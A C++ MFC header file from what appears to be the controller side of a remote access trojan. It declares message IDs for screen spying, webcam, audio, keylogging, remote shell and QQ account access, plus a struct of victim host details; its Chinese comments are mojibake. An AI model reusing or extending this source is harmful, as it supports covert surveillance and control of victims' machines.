// stdafx.h : include file for standard system include files,
// or project specific include files that are used frequently, but
// are changed infrequently
//

#if !defined(AFX_STDAFX_H__4B858A7B_A54D_460A_A51B_CD810BB0B803__INCLUDED_)
#define AFX_STDAFX_H__4B858A7B_A54D_460A_A51B_CD810BB0B803__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#define VC_EXTRALEAN		// Exclude rarely-used stuff from Windows headers

#include <afxwin.h>         // MFC core and standard components
#include <afxext.h>         // MFC extensions
#include <afxcview.h>
#include <afxdisp.h>        // MFC Automation classes
#include <afxdtctl.h>		// MFC support for Internet Explorer 4 Common Controls
#ifndef _AFX_NO_AFXCMN_SUPPORT
#include <afxcmn.h>			// MFC support for Windows Common Controls
#endif // _AFX_NO_AFXCMN_SUPPORT

#include "sal.h"
#include <afxtempl.h>
#include <winsock2.h>
#include <winioctl.h>

#define _XTP_STATICLINK
#include "XTToolkitPro.h"
#include "SkinH.h"
#pragma comment ( lib, "SkinH.lib" )

#include "cJSON.h"
#include "include\IOCPServer.h"
#include "macros.h"
#include "vfw.h" // DrawDibOpen
#pragma comment(lib, "vfw32.lib")

enum 
{
	WM_CLIENT_CONNECT = WM_APP + 0x1001,
	WM_CLIENT_CLOSE,
	WM_CLIENT_NOTIFY,
	WM_DATA_IN_MSG,
	WM_DATA_OUT_MSG,

	WM_ADDTOLIST = WM_USER + 102,	// ��ӵ��б���ͼ��
	WM_ADDFINDGROUP,				// ����ʱ���ҷ���
	WM_REMOVEFROMLIST,				// ���б���ͼ��ɾ��
	WM_OPENMANAGERDIALOG,			// ��һ���ļ�������
	WM_OPENSCREENSPYDIALOG,			// ��һ����Ļ���Ӵ���
	WM_OPENWEBCAMDIALOG,			// ������ͷ���Ӵ���
	WM_OPENAUDIODIALOG,				// ��һ��������������
	WM_OPENKEYBOARDDIALOG,			// �򿪼��̼�¼����
	WM_OPENSYSTEMDIALOG,			// �򿪽��̹�����
	WM_OPENSHELLDIALOG,				// ��shell����
	WM_RESETPORT,					// �ı�˿�
	WM_OPENSYSINFODIALOG,			// �򿪷�������Ϣ����
	WM_OPENREGEDITDIALOG,           // ��ע��������
	WM_OPENDLLDLG,                  // �򿪹��ܿؼ����ش���
	WM_OPENCHATDIALOG,		    	// �򿪽�̸����
	WM_OPENQQINFODIALOG,			// ��QQ������Ϣ����
	WM_OPENPSERLISTDIALOG,			// �򿪷��������
	WM_MODIFYLIST,					// ɸѡ
	WM_NOMODIFYLIST,				// ɸѡ
	WM_OPENPROXYMAPDIALOG,
//////////////////////////////////////////////////////////////////////////
	FILEMANAGER_DLG = 1,
	SCREENSPY_DLG,
	WEBCAM_DLG,
	AUDIO_DLG,
	KEYBOARD_DLG,
	SYSTEM_DLG,
	CHAT_DLG,
	SHELL_DLG,
	SYSINFO_DLG,
	REGEDIT_DLG,
	SERMANAGER_DLG,
	QQINFO_DLG,
	DLL_DLG,
	PROXYMAP_DLG
};

typedef struct
{	
	BYTE			bToken;			// = 1
	OSVERSIONINFOEX	OsVerInfoEx;	// �汾��Ϣ
	DWORD			dwCPUClockMhz;	// CPUƵ��
	int				nCPUNumber;		// CPU����
	IN_ADDR			WanIPAddress;	// �洢32λ��IPv4�ĵ�ַ���ݽṹ(����)
	IN_ADDR			LanIPAddress;	// �洢32λ��IPv4�ĵ�ַ���ݽṹ(����)
	char			HostName[256];	// ������
	bool			bIsWebCam;		// �Ƿ�������ͷ
	DWORD			dwSpeed;		// ����
	DWORD			Speed;		    // ����
	DWORD			MemSize;		// �ڴ��С
	DWORD			DriverSize;		// Ӳ������
	char			UpGroup[50];	// ���߷���
	char			RunTime[32];	// ����ʱ��
	char			szVersion[32];	// ���߰汾
	char            Virus[50];
	BOOL            bIs64;          // 32λor 64λ 1Ϊ64 0Ϊ32     
	char			MarkTime[50];   // ����˰�װʱ��
	CHAR szQQNum[256];     //��ǰ���е�QQ����
	BOOL  bIsActive;	   //�û�״̬
	TCHAR sznet[20];       //net type
	IN_ADDR	    	IPAddress;	// �洢32λ��IPv4�ĵ�ַ���ݽṹ
}LOGININFO;

typedef struct 
{
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
}FILESIZE;



#define WM_SYSTRAY						WM_USER+100
#define MAKEINT64(low, high) ((unsigned __int64)(((DWORD)(low)) | ((unsigned __int64)((DWORD)(high))) << 32))

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_STDAFX_H__4B858A7B_A54D_460A_A51B_CD810BB0B803__INCLUDED_)
